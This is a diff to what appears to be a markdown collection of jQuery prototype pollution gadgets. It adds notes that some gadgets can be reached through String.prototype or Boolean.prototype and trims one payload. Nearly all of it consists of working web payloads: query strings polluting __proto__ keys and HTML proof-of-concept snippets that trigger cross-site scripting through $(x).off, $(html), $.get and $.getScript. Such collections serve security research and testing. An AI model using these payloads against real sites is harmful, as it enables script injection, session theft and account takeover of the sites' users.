@@ -11,6 +11,8 @@ return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.j
 
 #### $(x).off jQuery all versions
 
+* Can be exploited through String.prototype
+
 ```
 ?__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(document.domain)>
 ```
@@ -29,13 +31,13 @@ return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.j
 #### $(html) jQuery all versions
 
 ```
-?__proto__[div][0]=1&__proto__[div][1]=<img src onerror%3dalert(1)>&__proto__[div][2]=1
+?__proto__[div][0]=1&__proto__[div][1]=<img src onerror%3dalert(1)>
 ```
 
 ```html
 <script/src=https://code.jquery.com/jquery-3.3.1.js></script>
 <script>
-  Object.prototype.div=['1','<img src onerror=alert(1)>','1']
+  Object.prototype.div=['1','<img src onerror=alert(1)>']
 </script>
 <script>
   $('<div x="x"></div>')
@@ -45,6 +47,7 @@ return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.j
 #### $.get jQuery >= 3.0.0
 
 * Also can be used for $.post, $.ajax, $.getJSON
+* Can be exploited through Boolean.prototype
 
 ```
 ?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
@@ -79,6 +82,8 @@ return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.j
 
 #### $.getScript jQuery 3.0.0 - 3.3.1
 
+* Can be exploited through Boolean.prototype
+
 ```
 ?__proto__[url]=data:,alert(1)//
 ```
@@ -111,6 +116,8 @@ return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.j
 ```
 
 #### $.get jQuery >= 3.0.0
+
+* Can be exploited through Boolean.prototype
 
 ```
 ?__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=
